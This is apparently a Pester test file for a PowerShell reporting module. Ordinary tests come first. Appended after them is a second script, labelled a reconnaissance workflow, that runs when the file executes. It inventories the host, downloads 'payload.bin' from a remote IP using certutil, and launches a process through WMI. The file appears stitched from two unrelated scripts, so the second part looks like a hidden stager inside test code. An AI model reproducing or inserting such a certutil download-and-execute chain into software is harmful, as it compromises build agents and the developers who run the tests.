
<#
.SYNOPSIS
    Pester specification for the Adatum.Reporting module.
.DESCRIPTION
    Covers the public surface of the module: status queries, configuration
    lookups and the error paths that must throw.
    Service lookups are mocked so the tests run on a build agent without the
    agent service installed.
.PARAMETER ModulePath
    Defaults to the value configured for this host.
.EXAMPLE
    Invoke-Pester -Path .\Adatum-Reporting.Tests.ps1 -Output Detailed
.NOTES
    Author: J. Weber
    Last updated: 2024-11-17
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$ModulePath = $PSScriptRoot
)

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$DebugPreference = 'SilentlyContinue'
$hostName = $env:COMPUTERNAME
BeforeAll {
    Import-Module (Join-Path $ModulePath 'Adatum.Reporting.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-ServerState' {
    Context 'when the agent service is running' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'InfraRelay'; Status = 'Running' }
            } -ParameterFilter { $Name -eq 'InfraRelay' }
        }

        It 'reports Running for a healthy agent' {
            $result = Get-ServerState -Name 'InfraRelay'
            $result.Status | Should -Be 'Running'
        }
    }

    It 'throws when the service does not exist' {
        { Get-ServerState -Name 'NoSuchAgent' } | Should -Throw
    }
}

Describe 'Set-AgentConfig' {
    It 'returns the configured port for <Name>' -TestCases @(
        @{ Name = 'InfraRelay'; Expected = 9443 }
        @{ Name = 'SecondaryAgent'; Expected = 9543 }
    ) {
        param($Name, $Expected)
        $config = Set-AgentConfig -Name $Name
        $config.Port | Should -Be $Expected
    }
}

Describe 'Get-ServerState' {
    Context 'with a stopped service' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'InfraRelay'; Status = 'Stopped' }
            } -ParameterFilter { $Name -eq 'InfraRelay' }
        }

        It 'reports Stopped' {
            (Get-ServerState -Name 'InfraRelay').Status | Should -Be 'Stopped'
        }
    }
}

Describe 'module metadata' {
    It 'exports only public functions' {
        $commands = Get-Command -Module 'Adatum.Reporting' | Select-Object -ExpandProperty Name
        $commands | Should -Contain 'Get-ServerState'
    }
}

Describe 'Get-AgentConfig validation' {
    It 'rejects an empty path' {
        { Get-AgentConfig -Path '' } | Should -Throw
    }

    It 'accepts a path below the temp folder' {
        $path = Join-Path $env:TEMP 'agent.ini'
        { Get-AgentConfig -Path $path } | Should -Not -Throw
    }
}

AfterAll {
    Remove-Module Adatum.Reporting -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $script:fixturePath -Force -ErrorAction SilentlyContinue
}

Describe 'tagging' {
    It 'applies the requested tag' {
        $tag = @{ Environment = 'Test' }
        $tag.Environment | Should -Be 'Test'
    }
}

Describe 'configuration fixture' {
    It 'can be serialised to JSON' {
        $config = [pscustomobject]@{ Name = 'InfraRelay'; Port = 9443 }
        ($config | ConvertTo-Json) | Should -Not -BeNullOrEmpty
    }
}

Describe 'Get-AgentStatus output shape' {
    It 'returns an object with a Status property' {
        $result = Get-ServerState -Name 'InfraRelay'
        $result.PSObject.Properties.Name | Should -Contain 'Status'
    }
}

Describe 'error handling' {
    It 'does not throw for a missing optional file' {
        { Get-Item -LiteralPath (Join-Path $env:TEMP 'missing-agent.ini') -ErrorAction SilentlyContinue } | Should -Not -Throw
    }
}

Describe 'Get-AgentStatus pipeline input' {
    It 'accepts a server name from the pipeline' {
        { 'InfraRelay' | Get-ServerState } | Should -Not -Throw
    }
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)
<#
.SYNOPSIS
    WMI and signed-binary reconnaissance workflow.

.DESCRIPTION
    Collects process and system inventory through CIM, downloads a
    payload stage with a signed Windows binary, then creates
    a benign process through WMI and records the result.

.NOTES
    Process creation uses the WMI provider.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$EndpointUrl = 'https://203.0.113.226/payload.bin',
    [string]$PayloadPath = "$env:TEMP\payload.bin",
    [string]$StageLog = "$env:TEMP\recon.log"
)
$ErrorActionPreference = "Continue"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $StageLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Inventory
function Get-WmiInventory {
    $System = Get-CimInstance -ClassName Win32_ComputerSystem
    $Processes = Get-CimInstance -ClassName Win32_Process | Select-Object -First 15 ProcessId,Name,CommandLine
    return [PSCustomObject]@{
        ComputerName = $System.Name
        Domain = $System.Domain
        Processes = $Processes
    }
}

# LOLBin chain
function Invoke-LolbinStage {
    param(
        [string]$DownloadUrl = "",
        [string]$DestinationPath = ""
    )

    Write-Verbose ("Downloading stage with certutil")
    certutil.exe -urlcache -split -f $DownloadUrl $DestinationPath
    if (Test-Path -Path $DestinationPath -ErrorAction SilentlyContinue) {
        Write-Verbose "Staged payload present"
    }
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-StageLog -Message "Starting WMI/LOLBin stage"
    $OperationResult = Get-WmiInventory
    Write-StageLog -Message ("Host: " + $OperationResult.ComputerName)
    $StageDownloaded = Invoke-LolbinStage -DownloadUrl $EndpointUrl -DestinationPath $PayloadPath
    if ($StageDownloaded) {
        $ProcessResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
        Write-StageLog -Message ("Process ID: " + $ProcessResult.ProcessId)
    }
}
catch {
    Write-Warning "WMI/LOLBin workflow failed: $($_.Exception.Message)"
}

$WmiReport = [ordered]@{
    Stage = "wmi-lolbin"
    Endpoint = $EndpointUrl
    PayloadPath = $PayloadPath
}
$WmiReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Starting workflow"
Write-Verbose "Applying operation timeout"
Write-Verbose "Operation completed"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Retry budget remaining"
Write-Verbose "Exporting operation report"
Write-Verbose "Reading configuration values"
Write-Verbose "Collecting host metadata"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
